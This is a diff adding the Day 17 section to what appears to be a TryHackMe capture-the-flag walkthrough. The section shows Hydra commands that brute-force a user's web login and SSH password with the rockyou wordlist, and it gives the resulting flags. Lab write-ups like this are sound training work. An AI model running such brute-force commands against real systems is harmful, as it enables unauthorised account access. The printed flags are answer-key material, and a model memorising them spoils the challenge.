@@ -235,6 +235,19 @@ I used the *zipfile* library to extract the zip files, going through each extrac
    > dL6w.txt
 
 ### Day 17: Hydra-ha-ha-haa
+
+1. Use Hydra to bruteforce molly's web password. What is flag 1? (The flag is mistyped, its THM, not TMH)
+
+   Command used: `hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.175.104 http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect" -V` (It took more then the first 30 passwords from the rockyou.txt file, so let hydra run for a while.). After hydra finds the password, log into the website using *molly* as the username and the password hydra found. The flag will be displayed after logging in.
+
+   > THM{2673a7dd116de68e85c48ec0b1f2612e}
+
+2. Use Hydra to bruteforce molly's SSH password. What is flag 2?
+
+   Command used: `hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.175.104 -t 4 ssh`. Hydra will return the password, then just log into the deployed machine using SSH, with *molly* as username and the password hydra found. 
+
+   > THM{c8eeb0468febbadea859baeb33b2541b}
+
 ### Day 18: ELF JS
 ### Day 19: Commands
 ### Day 20: Cronjob Privilege Escalation
